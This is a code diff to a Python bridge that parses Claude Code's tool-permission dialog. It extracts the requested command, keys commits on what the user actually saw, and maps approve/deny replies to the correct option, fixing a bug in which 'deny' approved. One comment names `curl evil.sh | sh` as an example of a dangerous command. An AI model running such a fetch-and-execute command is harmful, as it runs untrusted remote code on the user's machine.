@@ -87,6 +87,36 @@ _PLAN_FOOTER_RE = re.compile(
     re.IGNORECASE,
 )
 
+# Tool-permission footer: Claude Code's permission dialog ("Do you want to
+# proceed?", "Do you want to create notes.txt?") prints this instead of
+# either literal above. Captured from Claude Code 2.1.282:
+#
+#     Do you want to proceed?
+#     ❯ 1. Yes
+#       2. Yes, and always allow access to /Users/dev/scratch from this
+#          project
+#       3. No
+#
+#     Esc to cancel · Tab to amend
+#
+# Missing it meant the most common decision an agent blocks on — permission
+# to run a tool — never reached any client as a choice. Anchored to line
+# start for the same reason as ``_PLAN_FOOTER_RE``.
+_PERMISSION_FOOTER_RE = re.compile(
+    r"^Esc to cancel\s*·\s*Tab to amend",
+    re.IGNORECASE,
+)
+
+# A permission dialog may offer only Yes / No: Claude Code drops the
+# persistent "always allow" row when accepting it would write a broader rule
+# than the ask itself. The footer literal already proves this is a widget,
+# so the prose-guarding ``_MIN_OPTIONS`` floor does not apply to it.
+_MIN_PERMISSION_OPTIONS = 2
+
+# A row made only of rule characters: the dialog's full-width divider (─)
+# and the dashed frame around a file preview (╌).
+_RULE_ROW_RE = re.compile(r"^[\s─━╌╍┄┅┈┉═-]+$")
+
 # Cursor glyphs the TUI widget paints at column 0 of the focused row.
 # Different Claude Code builds have shipped different chars — support
 # all of them so a font-substitution quirk on one machine doesn't
@@ -193,11 +223,44 @@ class ChoicePrompt:
     # body can stream in / change while the same prompt stays on screen, and
     # re-keying the signature on it would re-broadcast the prompt every poll.
     body: list[str] = field(default_factory=list)
+    # What the prompt is asking for:
+    #   - "choice": pick one of several answers (the default).
+    #   - "permission": Claude Code's tool-permission dialog. Option 0 is
+    #     "Yes", and one option is "No" — which is what lets a client, or
+    #     the bridge itself, map "approve" / "deny" onto a real option
+    #     instead of typing the word into the widget.
+    # Excluded from ``signature``, like ``input_mode``: it is implied by the
+    # prompt's shape.
+    kind: str = "choice"
+
+    # What the user was actually shown, as one value: title + options + BODY.
+    #
+    # Fixed at detection and never recomputed. The `body` field is later
+    # REPLACED for display -- the rising edge swaps in a deeper capture so the
+    # lens can show a whole plan -- and recomputing the key off that made the
+    # cached value describe a different capture window from the one the commit
+    # re-detects at, which refused every approval. The key describes what the
+    # detector saw; `body` describes what the reader sees.
+    # ``signature`` exists to deduplicate broadcasts and must not move while the
+    # body streams in, which means it cannot answer the only question that
+    # matters at commit time -- "is this the prompt the human decided about?".
+    # On Claude Code's permission dialog the title ("Do you want to proceed?")
+    # and the options (Yes / Yes-don't-ask / No) are boilerplate, so a prompt for
+    # `git status` and one for `curl evil.sh | sh` share a signature exactly;
+    # the command lives in the body. Keyed on the body as well, the two differ,
+    # so a commit against a prompt the user never saw can be refused.
+    commit_key: str = field(default="")
 
     def __post_init__(self) -> None:
         if not self.signature:
             joined = f"{self.title}\n" + "\n".join(self.options)
             self.signature = hashlib.sha1(joined.encode("utf-8")).hexdigest()[:16]
+        if not self.commit_key:
+            basis = (
+                f"{self.title}\n" + "\n".join(self.options)
+                + "\n--\n" + "\n".join(self.body)
+            )
+            self.commit_key = hashlib.sha256(basis.encode("utf-8")).hexdigest()[:32]
 
 
 def detect_choice_prompt(lines: list[str]) -> ChoicePrompt | None:
@@ -234,7 +297,11 @@ def has_select_footer(lines: list[str]) -> bool:
         stripped = line.strip()
         if not stripped:
             continue
-        if _TUI_FOOTER_RE.search(stripped) or _PLAN_FOOTER_RE.search(stripped):
+        if (
+            _TUI_FOOTER_RE.search(stripped)
+            or _PLAN_FOOTER_RE.search(stripped)
+            or _PERMISSION_FOOTER_RE.search(stripped)
+        ):
             return True
     return False
 
@@ -268,6 +335,7 @@ def _detect_tui_select_prompt(lines: list[str]) -> ChoicePrompt | None:
     #       lines case in narrow terminals (Claude Code wraps the
     #       footer when the pane width is below ~70 cols).
     footer_idx = None
+    permission = False
     # Strategy (a): scan up from the bottom past blanks + chrome, check
     # the first non-chrome row.
     for i in range(len(lines) - 1, -1, -1):
@@ -278,6 +346,10 @@ def _detect_tui_select_prompt(lines: list[str]) -> ChoicePrompt | None:
             continue
         if _TUI_FOOTER_RE.search(stripped) or _PLAN_FOOTER_RE.search(stripped):
             footer_idx = i
+            break
+        if _PERMISSION_FOOTER_RE.search(stripped):
+            footer_idx = i
+            permission = True
             break
         # Strategy (b): the bottom row contains only the tail "Esc to
         # cancel"; look upward 1–2 lines for the "Enter to select"
@@ -302,6 +374,12 @@ def _detect_tui_select_prompt(lines: list[str]) -> ChoicePrompt | None:
 
     # 2. Walk up from the line above the footer collecting options.
     options: list[tuple[int, int, str, bool]] = []  # (idx, num, text, has_cursor)
+    # Indented rows seen since the last option, bottom-up. In a permission
+    # dialog they are the option's own label wrapped at the pane edge
+    # ("Yes, and always allow access to /very/long/path" + "from this
+    # project"), so they are joined back on. Elsewhere they are a separate
+    # description under the label and are skipped, as before.
+    wrapped: list[str] = []
     blank_streak = 0
     i = footer_idx - 1
     while i >= 0 and len(options) < _MAX_OPTIONS:
@@ -337,6 +415,9 @@ def _detect_tui_select_prompt(lines: list[str]) -> ChoicePrompt | None:
         if m:
             num = int(m.group("num"))
             text = m.group("text").strip()
+            if permission and wrapped:
+                text = " ".join([text, *reversed(wrapped)])
+            wrapped = []
             has_cursor = bool(m.group("cursor"))
             options.append((i, num, text, has_cursor))
             i -= 1
@@ -361,6 +442,12 @@ def _detect_tui_select_prompt(lines: list[str]) -> ChoicePrompt | None:
             and (stripped.endswith("?") or stripped.endswith(":"))
         ):
             break
+        if permission and is_continuation:
+            # Also taken before any option is collected: the LAST option
+            # can wrap too, which puts its tail directly above the footer.
+            wrapped.append(stripped)
+            i -= 1
+            continue
         if options:
             i -= 1
             continue
@@ -368,7 +455,7 @@ def _detect_tui_select_prompt(lines: list[str]) -> ChoicePrompt | None:
         # above the footer — not a select prompt.
         return None
 
-    if len(options) < _MIN_OPTIONS:
+    if len(options) < (_MIN_PERMISSION_OPTIONS if permission else _MIN_OPTIONS):
         return None
 
     options.reverse()  # bottom-up → chronological
@@ -391,6 +478,7 @@ def _detect_tui_select_prompt(lines: list[str]) -> ChoicePrompt | None:
     # 5. Title from 1–4 non-blank lines above the topmost option.
     first_opt_idx = options[0][0]
     title = ""
+    title_idx = first_opt_idx
     for back in range(1, 5):
         tidx = first_opt_idx - back
         if tidx < 0:
@@ -403,6 +491,7 @@ def _detect_tui_select_prompt(lines: list[str]) -> ChoicePrompt | None:
         if lines[tidx].startswith(("     ", "\t")):
             continue
         title = candidate
+        title_idx = tidx
         break
 
     option_texts = [text for _, _, text, _ in options]
@@ -411,8 +500,90 @@ def _detect_tui_select_prompt(lines: list[str]) -> ChoicePrompt | None:
         options=option_texts,
         input_mode="tui_select",
         focused_index=focused_index,
-        body=_extract_body(lines, first_opt_idx),
+        body=(
+            _permission_body(lines, title_idx) if permission
+            else _extract_body(lines, first_opt_idx)
+        ),
+        kind="permission" if permission else "choice",
     )
+
+
+def _permission_body(lines: list[str], title_idx: int) -> list[str]:
+    """The permission dialog's own content: what is being asked for.
+
+    Everything between the dialog's full-width divider and its question —
+    the tool, the command and its description, or the file preview. The
+    generic ``_extract_body`` walks back through the whole conversation,
+    which on a permission card buries the one thing the reader has to
+    judge under everything that led up to it. Falls back to that when no
+    divider is on screen.
+    """
+    start = None
+    for k in range(title_idx - 1, -1, -1):
+        s = lines[k].strip()
+        if s and set(s) <= {"─", "━"}:
+            start = k + 1
+            break
+    if start is None:
+        return _extract_body(lines, title_idx)
+    body: list[str] = []
+    for raw in lines[start:title_idx]:
+        s = raw.strip()
+        if not s or _RULE_ROW_RE.match(s) or _ANSI_CSI_RE.search(raw):
+            continue
+        body.append(s)
+    return body[-_MAX_BODY_LINES:]
+
+
+# Replies that mean "yes" or "no" to a permission dialog, normalised by
+# ``_normalise_reply``. Deliberately short, and asymmetric in what it risks:
+# approving runs a tool, denying runs nothing. So the approve set is only
+# unambiguous assent, and anything that sounds like stopping is a denial.
+#
+# ``/approve`` and ``/deny`` are what the iOS permission card sends;
+# ``yes proceed`` and ``no deny`` are what ``mac_voice_loop`` sends.
+_APPROVE_REPLIES = frozenset({
+    "/approve", "approve", "approved", "yes", "yes proceed", "proceed",
+    "allow", "allow it", "go ahead", "do it", "accept",
+})
+_DENY_REPLIES = frozenset({
+    "/deny", "deny", "denied", "no", "no deny", "reject", "decline",
+    "cancel", "dont", "don't", "do not", "stop",
+})
+
+
+def _normalise_reply(message: str) -> str:
+    text = message.strip().lower()
+    text = re.sub(r"[.,!?]", " ", text)
+    return " ".join(text.split())
+
+
+def permission_reply_index(prompt: ChoicePrompt, message: str) -> int | None:
+    """Map an approve/deny reply onto the permission option it means.
+
+    Returns the 0-based option index, or ``None`` when ``message`` is not a
+    plain approval or denial, or ``prompt`` is not a permission dialog.
+
+    This exists because the reply used to be *typed*: ``/deny`` went into
+    the widget as text followed by Enter, the widget ignored the text, and
+    Enter picked the highlighted option — which is "Yes". Measured on
+    Claude Code 2.1.282: saying deny approved the command.
+
+    Approval is option 0, which the dialog always labels "Yes". Denial is
+    the option labelled "No", found by label rather than position because
+    the dialog drops its middle "always allow" row when that would grant
+    more than was asked.
+    """
+    if prompt.kind != "permission" or not prompt.options:
+        return None
+    reply = _normalise_reply(message)
+    if reply in _APPROVE_REPLIES:
+        return 0 if prompt.options[0].lower().startswith("yes") else None
+    if reply in _DENY_REPLIES:
+        for idx, text in enumerate(prompt.options):
+            if re.match(r"no\b", text.strip(), re.IGNORECASE):
+                return idx
+    return None
 
 
 def _detect_legacy_choice_prompt(lines: list[str]) -> ChoicePrompt | None:
